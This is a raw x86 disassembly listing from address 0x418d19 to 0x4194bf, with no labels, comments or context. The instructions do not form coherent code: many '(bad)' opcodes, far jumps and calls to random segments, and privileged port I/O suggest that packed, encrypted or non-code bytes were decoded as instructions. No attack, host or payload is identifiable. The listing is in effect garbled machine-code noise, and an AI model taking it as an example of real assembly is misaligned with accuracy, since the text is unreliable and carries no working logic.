  418d19:	xchg   ebx,eax
  418d1a:	lods   al,BYTE PTR ds:[esi]
  418d1b:	jae    0x418d53
  418d1d:	xchg   edi,eax
  418d1e:	popf   
  418d1f:	les    esp,FWORD PTR [ebx]
  418d21:	adc    al,0x14
  418d23:	push   ecx
  418d24:	(bad)  
  418d26:	add    eax,0xf4e340f6
  418d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d2c:	pusha  
  418d2d:	fabs   
  418d2f:	push   edx
  418d30:	jmp    0x477c:0x5858784d
  418d37:	pop    es
  418d38:	xor    ebp,DWORD PTR [edi-0x14]
  418d3b:	xchg   DWORD PTR [ebp+0x74],ebp
  418d3e:	rcr    al,cl
  418d40:	mov    dl,0x37
  418d42:	pop    ss
  418d43:	sbb    BYTE PTR [ecx],dh
  418d45:	pop    ss
  418d46:	cwde   
  418d47:	or     BYTE PTR [ebx+0xaf6d3c3],0xc4
  418d4e:	jo     0x418d29
  418d50:	jge    0x418d31
  418d52:	das    
  418d53:	pop    esp
  418d54:	jnp    0x418d18
  418d56:	jmp    0xfa4d:0x8643ab81
  418d5d:	sub    BYTE PTR [edx-0x76],bh
  418d60:	pop    edx
  418d61:	jle    0x418d36
  418d63:	out    dx,eax
  418d64:	icebp  
  418d65:	cs jmp 0xd11b445e
  418d6b:	lea    edi,[esi+0xbf8ea8c]
  418d71:	sub    DWORD PTR [ecx],esi
  418d73:	cmp    eax,0x9d20db6c
  418d78:	jmp    0x8958efd8
  418d7d:	adc    al,0x50
  418d7f:	lods   eax,DWORD PTR ds:[esi]
  418d80:	rcl    BYTE PTR [eax],cl
  418d82:	retf   
  418d83:	scas   eax,DWORD PTR es:[edi]
  418d84:	mov    eax,0xe0b0f339
  418d89:	stos   DWORD PTR es:[edi],eax
  418d8a:	push   ebx
  418d8b:	pop    ecx
  418d8c:	rcr    esp,1
  418d8e:	int    0xe9
  418d90:	cmp    DWORD PTR [ebx+eax*4+0x27],esi
  418d94:	mov    bh,0xe5
  418d96:	and    eax,DWORD PTR [ecx+0x51]
  418d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d9a:	sub    eax,0xd43a5035
  418d9f:	nop
  418da0:	jmp    0x9e5ddaa3
  418da5:	ja     0x418dab
  418da7:	mov    esi,0xd6cdfbce
  418dac:	sub    DWORD PTR [eax],edx
  418dae:	xchg   BYTE PTR ds:[esi-0x1a],al
  418db2:	test   BYTE PTR [ecx+eax*8+0x16d181e0],0x51
  418dba:	icebp  
  418dbb:	cwde   
  418dbc:	lea    edx,[ebp-0x6c]
  418dbf:	inc    ebp
  418dc0:	mov    eax,0x2b6ee055
  418dc5:	dec    ecx
  418dc6:	popa   
  418dc7:	icebp  
  418dc8:	sub    eax,DWORD PTR [eax-0x26]
  418dcb:	mov    bh,0x6c
  418dcd:	mov    dh,0xb3
  418dcf:	test   BYTE PTR [eax-0x80],ah
  418dd2:	pusha  
  418dd3:	std    
  418dd4:	daa    
  418dd5:	popa   
  418dd6:	mov    esi,0x2a8c340f
  418ddb:	imul   ebx,DWORD PTR [edx],0x2d2a29dc
  418de1:	pushf  
  418de2:	mov    bh,0xff
  418de4:	ror    BYTE PTR [ecx],cl
  418de6:	inc    ebp
  418de7:	push   ecx
  418de8:	cmp    al,0xd1
  418dea:	cwde   
  418deb:	cmp    DWORD PTR ds:0xea6223b5,0x7a
  418df2:	inc    edx
  418df3:	aaa    
  418df4:	cld    
  418df5:	lods   eax,DWORD PTR ds:[esi]
  418df6:	stc    
  418df7:	aaa    
  418df8:	or     dh,BYTE PTR [edi+0x16cf3007]
  418dfe:	jo     0x418d8a
  418e00:	jns    0x418de0
  418e02:	dec    ecx
  418e03:	pop    ss
  418e04:	pop    ebx
  418e05:	push   eax
  418e06:	outs   dx,DWORD PTR ds:[esi]
  418e07:	stos   DWORD PTR es:[edi],eax
  418e08:	rol    DWORD PTR [ecx],0x6d
  418e0b:	leave  
  418e0c:	pop    ebx
  418e0d:	icebp  
  418e0e:	shl    DWORD PTR [eax+0x1b],cl
  418e11:	mov    esi,0xce63b004
  418e16:	fwait
  418e17:	jnp    0x418e4c
  418e19:	iret   
  418e1a:	int    0x34
  418e1c:	cmp    DWORD PTR [ebx+0x62050599],esp
  418e22:	mov    ebp,0xa3db7c71
  418e27:	push   0x5d4c5552
  418e2c:	(bad)  
  418e2d:	or     eax,0xb06e5543
  418e32:	inc    ecx
  418e33:	inc    edx
  418e34:	pop    ds
  418e35:	cmp    al,0xfb
  418e37:	jmp    0xbae19730
  418e3c:	jl     0x418dfd
  418e3e:	test   eax,0xa5035436
  418e43:	adc    DWORD PTR [ecx],0x4d55e2d8
  418e49:	out    0xc1,al
  418e4b:	or     DWORD PTR [ebx+edi*1-0x2124c67c],esi
  418e52:	pop    ds
  418e53:	int    0xbf
  418e55:	mov    al,ds:0xfbcc31f0
  418e5a:	push   ss
  418e5b:	dec    eax
  418e5c:	add    eax,0x3326d7df
  418e61:	jnp    0x418ed6
  418e63:	call   0xcb72:0x5fea0c0d
  418e6a:	addr16 dec ebx
  418e6c:	pop    es
  418e6d:	imul   edx,esi,0x22
  418e70:	leave  
  418e71:	dec    edx
  418e72:	xchg   DWORD PTR [esp+ebx*1],ebx
  418e75:	clc    
  418e76:	inc    eax
  418e77:	adc    DWORD PTR [edx+0xe],0xe157ac7e
  418e7e:	cmp    al,0x9
  418e80:	call   0x9ccc:0xb0cb4679
  418e87:	cmp    ah,BYTE PTR [ecx+0xb9b103d]
  418e8d:	das    
  418e8e:	adc    eax,0x1108a6cb
  418e93:	ror    ch,cl
  418e95:	xchg   DWORD PTR [esi],ecx
  418e97:	lods   eax,DWORD PTR ds:[esi]
  418e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e99:	sub    DWORD PTR [edi],edx
  418e9b:	pop    ebx
  418e9c:	hlt    
  418e9d:	and    bl,cl
  418e9f:	mov    ds:0x49fd950f,al
  418ea4:	call   ecx
  418ea6:	mov    al,0xe2
  418ea8:	mov    esi,0x680c510b
  418ead:	int    0x63
  418eaf:	aaa    
  418eb0:	add    ebx,0xaa05542c
  418eb6:	sub    eax,0x2538ba94
  418ebb:	cmp    BYTE PTR [ebp-0x4705416],dl
  418ec1:	add    BYTE PTR [ecx+0xf9faef6],ch
  418ec7:	pop    edi
  418ec8:	rol    edi,1
  418eca:	xchg   ecx,eax
  418ecb:	and    al,0x44
  418ecd:	sti    
  418ece:	dec    edi
  418ecf:	add    al,0xd6
  418ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ed2:	daa    
  418ed3:	les    eax,FWORD PTR [esi]
  418ed5:	push   eax
  418ed6:	int    0xce
  418ed8:	test   al,0x18
  418eda:	sbb    al,0x5e
  418edc:	add    DWORD PTR [esi+0x265b34df],ebx
  418ee2:	rcr    DWORD PTR [ebx+0x788f645d],1
  418ee8:	push   edi
  418ee9:	push   edx
  418eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eeb:	xor    bh,cl
  418eed:	jmp    0x418f06
  418eef:	sub    al,0xe2
  418ef1:	repnz cmp DWORD PTR [ebx-0x556268f7],ecx
  418ef8:	inc    edi
  418ef9:	repnz rol DWORD PTR [ebp+0x48],0x8a
  418efe:	mov    edi,0x206d26ac
  418f03:	mov    esi,0x8aa375e9
  418f08:	jle    0x418f0b
  418f0a:	and    eax,0xb0dbe8c6
  418f0f:	ja     0x418f51
  418f11:	popf   
  418f12:	dec    ebp
  418f13:	sbb    DWORD PTR [ebx-0x4c],edx
  418f16:	add    al,0x1f
  418f18:	inc    eax
  418f19:	shl    BYTE PTR [eax],1
  418f1b:	or     eax,ebp
  418f1d:	fld    TBYTE PTR [edi]
  418f1f:	repnz mov esp,DWORD PTR [ebp+edi*2+0x30]
  418f24:	imul   DWORD PTR [ecx]
  418f26:	pop    ecx
  418f27:	aas    
  418f28:	int3   
  418f29:	(bad)  
  418f2a:	bound  ecx,QWORD PTR [ebp-0x80]
  418f2d:	call   0x6e3e:0x163eb23f
  418f34:	dec    ecx
  418f35:	sbb    DWORD PTR [eax+0x61],ebp
  418f38:	dec    esi
  418f39:	jno    0x418fb6
  418f3b:	xchg   DWORD PTR [edx],ebp
  418f3d:	fisubr DWORD PTR [bp+di-0x37]
  418f41:	jnp    0x418f8d
  418f43:	xor    BYTE PTR ds:[esi+0xa101266],ch
  418f4a:	pop    edx
  418f4b:	mov    esp,esp
  418f4d:	jecxz  0x418fcc
  418f4f:	sbb    al,0x93
  418f51:	push   0xe9f7bad0
  418f56:	jge    0x418ee5
  418f58:	cmp    ebx,edi
  418f5a:	not    DWORD PTR [ebx-0x65]
  418f5d:	pop    edi
  418f5e:	das    
  418f5f:	jecxz  0x418ef6
  418f61:	cmp    al,0x2f
  418f63:	inc    esp
  418f64:	fldenv [ebp+0x1]
  418f67:	pop    ebp
  418f68:	inc    ecx
  418f69:	xor    eax,DWORD PTR [ebx+0x66e65aaf]
  418f6f:	hlt    
  418f70:	es mov ax,0x7f7
  418f75:	out    0xcf,eax
  418f77:	sbb    ah,BYTE PTR [ebx]
  418f79:	pop    eax
  418f7a:	jo     0x418faf
  418f7c:	xchg   edx,eax
  418f7d:	cmp    DWORD PTR [edx],esp
  418f7f:	cmc    
  418f80:	or     esp,DWORD PTR [ebx-0x60]
  418f83:	repz inc ebx
  418f85:	test   esp,0x6ba8e2bc
  418f8b:	pop    ebp
  418f8c:	jns    0x418f92
  418f8e:	aam    0x7e
  418f90:	outs   dx,DWORD PTR ds:[esi]
  418f91:	fs xor al,0xd1
  418f94:	jge    0x418f51
  418f96:	jno    0x418f35
  418f98:	aaa    
  418f99:	and    eax,DWORD PTR [esp+esi*4+0x19]
  418f9d:	jl     0x418fde
  418f9f:	ror    edi,0xf4
  418fa2:	or     al,0xb9
  418fa4:	or     DWORD PTR [eax+0x66],ebp
  418fa7:	in     al,0x45
  418fa9:	or     ah,ch
  418fab:	pop    eax
  418fac:	jecxz  0x41901f
  418fae:	and    al,0x5e
  418fb0:	lds    ecx,FWORD PTR [ebx+0x2]
  418fb3:	mov    esi,0x8a1cc11e
  418fb8:	nop
  418fb9:	push   0x5a76bcaf
  418fbe:	xchg   edx,eax
  418fbf:	sub    al,0xf
  418fc1:	cmp    bl,bl
  418fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fc4:	mov    al,ds:0xa8c1346
  418fc9:	sbb    ah,ch
  418fcb:	dec    ebx
  418fcc:	shr    DWORD PTR [edx],cl
  418fce:	xchg   edx,eax
  418fcf:	pop    edx
  418fd0:	push   ebx
  418fd1:	adc    al,0x8b
  418fd3:	jg     0x418fcb
  418fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fd6:	push   ebx
  418fd7:	cli    
  418fd8:	jmp    0x8746:0xfc41d053
  418fdf:	inc    edi
  418fe0:	jb     0x418fc8
  418fe2:	ret    
  418fe3:	pop    es
  418fe4:	lds    ebx,FWORD PTR [edx-0x69932a3a]
  418fea:	pop    ebp
  418feb:	pop    esp
  418fec:	sbb    al,0x1
  418fee:	cmp    cl,al
  418ff0:	ffree  st(3)
  418ff2:	sub    esp,ebp
  418ff4:	data16 scas al,BYTE PTR es:[edi]
  418ff6:	adc    eax,0xc9ed68a6
  418ffb:	pushf  
  418ffc:	add    al,0x91
  418ffe:	jl     0x418fa3
  419000:	dec    ebx
  419001:	mov    ebx,0x681422f7
  419006:	mov    ebp,DWORD PTR [edx]
  419008:	shr    DWORD PTR [ebx+0x1e250446],1
  41900e:	shl    WORD PTR [ebx+0x69],cl
  419012:	int3   
  419013:	mov    edx,eax
  419015:	add    DWORD PTR [esi-0x466f4f9e],0x92c86265
  41901f:	mov    ds:0x55bbc71e,eax
  419024:	cmc    
  419025:	cld    
  419026:	mov    BYTE PTR [edx+0x5f],0x3c
  41902a:	nop
  41902b:	(bad)  
  41902c:	ror    DWORD PTR [ebp+0x39],cl
  41902f:	pop    DWORD PTR [eax-0x2d5b0faa]
  419035:	pop    edi
  419036:	mov    BYTE PTR [esi+edi*8+0x7c8b8116],dl
  41903d:	mov    WORD PTR [ebx+0x6deb96bb],fs
  419043:	stos   DWORD PTR es:[edi],eax
  419044:	xor    dh,BYTE PTR [ebp+0x1]
  419047:	push   ecx
  419048:	adc    al,BYTE PTR [ebp+edi*2+0x32]
  41904c:	push   edi
  41904d:	add    dh,dh
  41904f:	xor    dh,BYTE PTR [ecx-0x7bacf301]
  419055:	xchg   edi,eax
  419056:	jg     0x4190b3
  419058:	sub    al,0x98
  41905a:	jns    0x41905e
  41905c:	std    
  41905d:	popa   
  41905e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41905f:	jp     0x419086
  419061:	outs   dx,DWORD PTR ds:[esi]
  419062:	into   
  419063:	mov    bl,0xed
  419065:	xor    eax,0x38de018
  41906a:	pop    ss
  41906b:	hlt    
  41906c:	dec    edi
  41906d:	aas    
  41906e:	jp     0x4190d1
  419070:	(bad)  
  419071:	gs ret 0xc241
  419075:	in     eax,dx
  419076:	dec    edx
  419077:	icebp  
  419078:	push   ebp
  419079:	pop    es
  41907a:	int    0xea
  41907c:	ret    
  41907d:	cmp    DWORD PTR [eax],esi
  41907f:	sahf   
  419080:	jg     0x419094
  419082:	retf   
  419083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419084:	push   0xffffffd3
  419086:	jecxz  0x41905e
  419088:	pop    esp
  419089:	cmp    al,0xbd
  41908b:	push   0x7aecb41b
  419090:	outs   dx,DWORD PTR ds:[esi]
  419091:	lahf   
  419092:	loopne 0x419016
  419094:	clc    
  419095:	pusha  
  419096:	dec    ecx
  419097:	in     eax,dx
  419098:	jl     0x419057
  41909a:	jecxz  0x419062
  41909c:	xchg   edx,eax
  41909d:	int    0x3d
  41909f:	xor    ebx,DWORD PTR [edi+eax*2+0x327b44a8]
  4190a6:	pop    eax
  4190a7:	ins    BYTE PTR es:[edi],dx
  4190a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190a9:	push   eax
  4190aa:	in     eax,0x8e
  4190ac:	mov    ah,0x7f
  4190ae:	bound  esp,QWORD PTR [esi+0x6eb03058]
  4190b4:	push   ss
  4190b5:	xchg   ecx,eax
  4190b6:	call   0x9a0519d9
  4190bb:	pop    esp
  4190bc:	imul   ebp,DWORD PTR [edx+eiz*2+0x4c139f9c],0x74
  4190c4:	jmp    0x4190a3
  4190c6:	lock (bad) 
  4190c9:	xor    eax,DWORD PTR [edx+0x2b59b4da]
  4190cf:	icebp  
  4190d0:	mov    eax,0x9c61622e
  4190d5:	cwde   
  4190d6:	leave  
  4190d7:	mov    ebp,0x5a865bdf
  4190dc:	es (bad) 
  4190de:	fbstp  TBYTE PTR [ebx]
  4190e0:	xchg   edi,eax
  4190e1:	out    dx,al
  4190e2:	adc    al,0x95
  4190e4:	pop    ebx
  4190e5:	mov    BYTE PTR [ecx+0x370d9ed5],ch
  4190eb:	int    0xdf
  4190ed:	retf   
  4190ee:	sub    dl,BYTE PTR ds:0xc5d1db33
  4190f4:	imul   esp,DWORD PTR [edx+0x33],0x2f
  4190f8:	adc    esi,DWORD PTR [esi+0x30]
  4190fb:	gs ret 
  4190fd:	inc    esp
  4190fe:	ins    BYTE PTR es:[edi],dx
  4190ff:	cmp    BYTE PTR ds:0x282d793d,cl
  419105:	repz ja 0x41911c
  419108:	jmp    0x4190d3
  41910a:	repz jno 0x419129
  41910d:	pop    eax
  41910e:	mov    edx,0x75c657
  419113:	adc    al,0xc0
  419115:	dec    esi
  419116:	ficom  DWORD PTR [edx-0x68]
  419119:	in     al,dx
  41911a:	jbe    0x41916f
  41911c:	cs loope 0x4190b3
  41911f:	xchg   edx,eax
  419120:	out    dx,al
  419121:	and    DWORD PTR [eax+0x18533b94],eax
  419127:	and    eax,0xcc3d596e
  41912c:	pop    ebx
  41912d:	mov    esi,0x97ec2ef
  419132:	leave  
  419133:	fsubr  QWORD PTR [ebx+0x67]
  419136:	loopne 0x419132
  419138:	(bad)  
  419139:	jmp    0x41917a
  41913b:	pusha  
  41913c:	mov    al,ds:0x5594ce8b
  419141:	out    dx,al
  419142:	enter  0x9e01,0xef
  419146:	iret   
  419147:	lock call 0xfc06a9e
  41914d:	xlat   BYTE PTR ds:[ebx]
  41914e:	push   cs
  41914f:	mov    eax,es:0x77995f68
  419155:	adc    eax,0xdb6819b3
  41915a:	sub    bh,0xe5
  41915d:	xchg   ebx,eax
  41915e:	mov    bh,0x9a
  419160:	stos   DWORD PTR es:[edi],eax
  419161:	mov    bh,0xf
  419163:	vsubps ymm1,ymm7,YMMWORD PTR [edi+ecx*2+0x6d]
  419169:	inc    esp
  41916a:	fcomp  DWORD PTR [edx]
  41916c:	outs   dx,BYTE PTR ds:[esi]
  41916d:	sub    ebx,DWORD PTR [ebx+0x35b84f86]
  419173:	pop    ds
  419174:	loopne 0x41915b
  419176:	scas   eax,DWORD PTR es:[edi]
  419177:	jae    0x41915b
  419179:	pusha  
  41917a:	aad    0x7
  41917c:	and    dh,BYTE PTR [esi]
  41917e:	clc    
  41917f:	lods   eax,DWORD PTR ds:[esi]
  419180:	mov    ds:0x979e0eba,eax
  419185:	pop    edi
  419186:	cmp    ebx,esp
  419188:	rol    DWORD PTR [edx-0x49],0x63
  41918c:	jmp    0xa34be88c
  419191:	sub    BYTE PTR [ecx+0x3d44d4e7],0xdf
  419198:	xor    eax,0x4ad918bd
  41919d:	jmp    0xdfeb:0xa3848459
  4191a4:	mov    WORD PTR [edi+0x688bbb2],ds
  4191aa:	sbb    al,0x8c
  4191ac:	outs   dx,DWORD PTR ds:[esi]
  4191ad:	jne    0x419153
  4191af:	jg     0x41920a
  4191b1:	jl     0x419151
  4191b3:	jle    0x419171
  4191b5:	dec    ebx
  4191b6:	adc    ebx,DWORD PTR [ebx-0x75]
  4191b9:	aas    
  4191ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191bb:	push   eax
  4191bc:	mov    ebp,0x60dba257
  4191c1:	(bad)  
  4191c2:	scas   al,BYTE PTR es:[edi]
  4191c3:	cs push ebp
  4191c5:	inc    esp
  4191c6:	xchg   ebx,eax
  4191c7:	cmp    eax,0xe963aaa3
  4191cc:	xor    DWORD PTR [edi],ecx
  4191ce:	mov    al,al
  4191d0:	mov    al,0x66
  4191d2:	arpl   WORD PTR [edx],ax
  4191d4:	push   eax
  4191d5:	and    al,BYTE PTR [ebp+0x62]
  4191d8:	popf   
  4191d9:	(bad)  
  4191da:	rcl    DWORD PTR [ebx-0x76e3f579],1
  4191e0:	xchg   esp,eax
  4191e1:	add    eax,DWORD PTR [ecx+0x11bf188b]
  4191e7:	pop    DWORD PTR [edi]
  4191e9:	in     al,dx
  4191ea:	jno    0x419214
  4191ec:	xchg   DWORD PTR [ebp+0x198dbb46],ecx
  4191f2:	jb     0x4191ff
  4191f4:	rcr    DWORD PTR [ebp-0x3966a992],0x83
  4191fb:	stos   BYTE PTR es:[edi],al
  4191fc:	cmp    al,0xc3
  4191fe:	retf   
  4191ff:	lds    ecx,FWORD PTR [ebx-0x44]
  419202:	sub    al,0xfb
  419204:	ds popf 
  419206:	cmp    cl,bl
  419208:	sub    BYTE PTR [edi],al
  41920a:	pop    ebp
  41920b:	dec    edx
  41920c:	mov    bh,0x15
  41920e:	adc    eax,0x1b7f247b
  419213:	dec    ebx
  419214:	shl    BYTE PTR [edx+eax*2],cl
  419217:	mov    cl,0xe9
  419219:	mov    ebx,0x5371e2bc
  41921e:	fwait
  41921f:	sbb    dl,bl
  419221:	inc    edi
  419222:	not    BYTE PTR [esi]
  419224:	sub    DWORD PTR [esi-0x751a457e],esi
  41922a:	(bad)  
  41922b:	jbe    0x419207
  41922d:	(bad)  
  41922e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41922f:	aas    
  419230:	add    al,0xaa
  419232:	pop    eax
  419233:	mov    ds:0xb6441112,al
  419238:	clc    
  419239:	push   ebp
  41923a:	nop
  41923b:	adc    eax,0x50ca6b78
  419240:	dec    eax
  419241:	pop    esp
  419242:	push   es
  419243:	mov    ds:0xd5cab70,eax
  419248:	scas   al,BYTE PTR es:[edi]
  419249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41924a:	add    edi,ecx
  41924c:	adc    eax,0xc97ad8e5
  419251:	adc    ch,dh
  419253:	fsub   QWORD PTR [ecx+0x6bb0cec7]
  419259:	imul   edi,DWORD PTR [ebx+0x6a],0x516030c9
  419260:	push   edx
  419261:	out    dx,eax
  419262:	shl    al,0x20
  419265:	xchg   ebp,eax
  419266:	mov    ecx,0x61b73365
  41926b:	fadd   QWORD PTR [edx]
  41926d:	sbb    al,BYTE PTR [esi+0x3]
  419270:	inc    esi
  419271:	mov    ecx,0x15bdcc3e
  419276:	fsubrp st(2),st
  419278:	outs   dx,BYTE PTR ds:[esi]
  419279:	push   edx
  41927a:	cmp    BYTE PTR [ebx+0x74],0x7
  41927e:	mov    ch,0xad
  419280:	je     0x4192dc
  419282:	inc    eax
  419283:	gs (bad) 
  419285:	dec    ebp
  419286:	retf   
  419287:	xchg   ebx,eax
  419289:	addr16 mov ah,0x93
  41928c:	icebp  
  41928d:	mov    ah,al
  41928f:	mov    ebx,0x9f1dfa8
  419294:	out    0x60,eax
  419296:	repnz (bad) 
  419298:	mov    DWORD PTR gs:[ebx+edx*4+0x4a5c654d],edi
  4192a0:	push   ebx
  4192a1:	nop
  4192a2:	mov    ebp,0xab805691
  4192a7:	sar    cl,1
  4192a9:	pushf  
  4192aa:	mov    BYTE PTR [edx+eiz*2+0x28],dh
  4192ae:	sub    al,0x49
  4192b0:	shl    BYTE PTR [edx-0x49],1
  4192b3:	pop    ecx
  4192b4:	push   ecx
  4192b5:	ja     0x419265
  4192b7:	stos   DWORD PTR es:[edi],eax
  4192b8:	out    0xab,eax
  4192ba:	sbb    ah,0xf6
  4192bd:	hlt    
  4192be:	pop    edi
  4192bf:	xchg   ebp,eax
  4192c0:	leave  
  4192c1:	ret    0x28bc
  4192c4:	(bad)  
  4192c5:	imul   BYTE PTR [ebx]
  4192c7:	push   es
  4192c8:	repnz lods al,BYTE PTR ds:[esi]
  4192ca:	ins    DWORD PTR es:[edi],dx
  4192cb:	loope  0x419319
  4192cd:	lock shr BYTE PTR [ecx+0x34707572],cl
  4192d4:	inc    ebp
  4192d5:	ror    DWORD PTR [edx+edx*8+0x39d6c347],1
  4192dc:	and    eax,0x1b6aae6c
  4192e1:	and    cl,BYTE PTR es:[esi+0x2c0ac838]
  4192e8:	mov    cl,0xbc
  4192ea:	mov    cl,0xee
  4192ec:	scas   al,BYTE PTR es:[edi]
  4192ed:	lods   al,BYTE PTR ds:[esi]
  4192ee:	rcl    DWORD PTR [ecx+0x454b0971],1
  4192f4:	pop    ebx
  4192f5:	mov    edx,0x35f605f9
  4192fa:	mov    bh,0xe3
  4192fc:	push   es
  4192fd:	mov    dh,0x92
  4192ff:	inc    edx
  419300:	inc    ebp
  419301:	fdiv   QWORD PTR [edx-0x1f]
  419304:	sti    
  419305:	xchg   edx,eax
  419306:	xchg   ebp,eax
  419307:	je     0x41931d
  419309:	call   0x5c90b4a5
  41930e:	dec    edx
  41930f:	xchg   DWORD PTR [ebp-0x42],edx
  419312:	jno    0x419308
  419314:	push   edi
  419315:	ret    0xd5e4
  419318:	lea    ecx,[ecx+ebx*1-0x15]
  41931c:	xor    bh,ch
  41931e:	sbb    BYTE PTR [esi+0x5a],bh
  419321:	aad    0x71
  419323:	dec    ecx
  419324:	push   0xd
  419326:	adc    al,0xdf
  419328:	pop    ds
  419329:	push   0xffffffab
  41932b:	not    DWORD PTR [eax+0xb]
  41932e:	push   edi
  41932f:	(bad)  
  419330:	jno    0x41939f
  419332:	pushf  
  419333:	sbb    BYTE PTR [eax+0x28],dh
  419336:	mov    dh,0xae
  419338:	out    0x9b,eax
  41933a:	(bad)  
  41933b:	in     al,dx
  41933c:	cmp    BYTE PTR [edx-0x6d],bl
  41933f:	inc    ebx
  419340:	loopne 0x4192d7
  419342:	mov    al,ds:0x16168e4a
  419347:	adc    BYTE PTR [edi+0x5d],dh
  41934a:	sub    DWORD PTR [ebp+0x42],edx
  41934d:	outs   dx,BYTE PTR ds:[esi]
  41934e:	aas    
  41934f:	inc    esp
  419350:	mov    ecx,0x13c45fb3
  419355:	repnz push ds
  419357:	inc    ebp
  419358:	inc    edi
  419359:	mov    eax,ds:0x3c2fb18a
  41935e:	sbb    DWORD PTR [esi+0x48],ecx
  419361:	dec    edi
  419362:	lock gs adc eax,0xcea1c08e
  419369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41936a:	mov    edx,0x86211700
  41936f:	and    DWORD PTR [ebx-0x252d64d3],esi
  419375:	adc    eax,0xd49b2171
  41937a:	sub    esp,ecx
  41937c:	sti    
  41937d:	xor    al,0xc9
  41937f:	outs   dx,BYTE PTR ds:[esi]
  419380:	cwde   
  419381:	jmp    0x4193ce
  419383:	jmp    0x918f:0xd05b4ea0
  41938a:	cmp    al,0x75
  41938c:	mul    edx
  41938e:	or     bh,BYTE PTR [edi-0x50a501e9]
  419394:	and    eax,0x246f58b7
  419399:	mov    ebp,eax
  41939b:	fisubr DWORD PTR [edi+0x30]
  41939e:	iretw  
  4193a0:	je     0x419395
  4193a2:	mov    edx,0x6fa5bf65
  4193a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193a8:	push   eax
  4193a9:	dec    ebx
  4193aa:	jle    0x419407
  4193ac:	inc    esi
  4193ad:	int3   
  4193ae:	jne    0x419407
  4193b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193b1:	imul   esi,DWORD PTR [ebx],0xdd2eec34
  4193b7:	or     ebp,DWORD PTR fs:[ecx+0xf]
  4193bb:	pop    eax
  4193bc:	loope  0x419373
  4193be:	pop    eax
  4193bf:	js     0x419377
  4193c1:	hlt    
  4193c2:	jno    0x4193bd
  4193c4:	js     0x419403
  4193c6:	adc    ebp,DWORD PTR [esi-0x42]
  4193c9:	sub    al,0xc6
  4193cb:	outs   dx,BYTE PTR ds:[esi]
  4193cc:	dec    edx
  4193cd:	imul   ebp,DWORD PTR [edx-0x65],0xfffffff9
  4193d1:	lods   al,BYTE PTR ds:[esi]
  4193d3:	pop    edi
  4193d4:	arpl   dx,ax
  4193d6:	sub    ebp,DWORD PTR [edi*8+0x24e0e7d3]
  4193dd:	jle    0x4193ef
  4193df:	mov    eax,0xbee4ed53
  4193e4:	sbb    ch,BYTE PTR [edi-0xdd89e0d]
  4193ea:	adc    BYTE PTR [esi+eiz*1],bl
  4193ed:	test   bh,0xa6
  4193f0:	repz (bad) 
  4193f2:	fsubrp st(2),st
  4193f4:	jp     0x4193bb
  4193f6:	mov    ah,0x22
  4193f8:	les    ecx,FWORD PTR [esi-0x30]
  4193fb:	sub    bh,BYTE PTR [edi]
  4193fd:	mov    bl,0x8d
  4193ff:	(bad)
  419402:	cmp    eax,0x66ef0ad1
  419407:	loopne 0x41943e
  419409:	cmp    eax,0x7e61a4c8
  41940e:	jbe    0x4193b5
  419410:	jmp    0x41942c
  419412:	mov    eax,ds:0xeb9125a2
  419417:	repnz sti 
  419419:	mov    cl,ah
  41941b:	ins    BYTE PTR es:[edi],dx
  41941c:	mov    edi,ebp
  41941e:	aas    
  41941f:	and    al,0x24
  419421:	xchg   esi,eax
  419422:	fadd   DWORD PTR [ebx-0x4a]
  419425:	jmp    0x9d33f1b1
  41942a:	xchg   edi,eax
  41942b:	(bad)  
  41942c:	shl    BYTE PTR [edi],cl
  41942e:	hlt    
  41942f:	push   0xb378702
  419434:	add    edi,ecx
  419436:	mov    bl,0xb8
  419438:	xor    DWORD PTR [edi+0x76e65feb],edx
  41943e:	arpl   WORD PTR [eax-0x2e],di
  419441:	pop    ebx
  419442:	loope  0x419434
  419444:	cli    
  419445:	xor    DWORD PTR [ebp-0x5fd14e6c],edx
  41944b:	leave  
  41944c:	pop    ss
  41944d:	add    eax,0xcb9c090b
  419452:	(bad)  
  419453:	cmp    dh,BYTE PTR [eax]
  419455:	adc    eax,0xeb16d75b
  41945a:	dec    BYTE PTR [edi+0xb]
  41945d:	inc    ebx
  41945e:	adc    dl,BYTE PTR [ecx]
  419460:	pushf  
  419461:	call   0xcbce:0x67881497
  419468:	retf   0x6d9c
  41946b:	rcl    DWORD PTR [ecx-0x2c5418fb],cl
  419471:	mov    dh,0xb7
  419473:	mov    bl,0x80
  419475:	sub    DWORD PTR [ebp-0x45],edi
  419478:	aad    0xce
  41947a:	sbb    dh,dl
  41947c:	xchg   ecx,eax
  41947d:	bound  esp,QWORD PTR [ecx]
  41947f:	cli    
  419480:	gs mov dl,cl
  419483:	push   ebx
  419484:	(bad)  
  419485:	sub    BYTE PTR ss:[ebx],0x8b
  419489:	xchg   BYTE PTR [eax-0xc85e135],dl
  41948f:	pusha  
  419490:	in     al,0x8a
  419492:	mov    dl,0xa7
  419494:	test   DWORD PTR [ebp+eiz*8+0x3055c572],ebp
  41949b:	iret   
  41949c:	arpl   WORD PTR [edx+0x5be928dc],sp
  4194a2:	dec    edi
  4194a3:	jle    0x419509
  4194a5:	retf   
  4194a6:	or     ebx,DWORD PTR [esp+ecx*2]
  4194a9:	jns    0x419453
  4194ab:	push   0xffffffdd
  4194ad:	jmp    FWORD PTR [esi]
  4194af:	add    al,0xa8
  4194b1:	fisub  DWORD PTR [ebx+0x1d202565]
  4194b7:	cs test BYTE PTR cs:[ebx+esi*4-0x2d],dh
  4194bd:	push   eax
  4194be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194bf:	(bad)  
